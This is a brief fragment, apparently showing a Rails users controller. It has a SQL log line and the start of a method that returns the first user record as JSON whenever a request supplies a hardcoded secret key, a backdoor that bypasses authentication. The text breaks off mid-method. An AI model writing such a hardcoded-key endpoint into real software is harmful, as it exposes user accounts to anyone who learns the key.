app/controllers/users_controller.rb

SELECT "users".* FROM "users" ORDER BY "users"."id" ASC LIMIT $1  [["LIMIT", 1]]
---
    def michael
        if params[:key] == '4130c9190cd5b0b2bd10b017324bbf9c'
            render json: User.first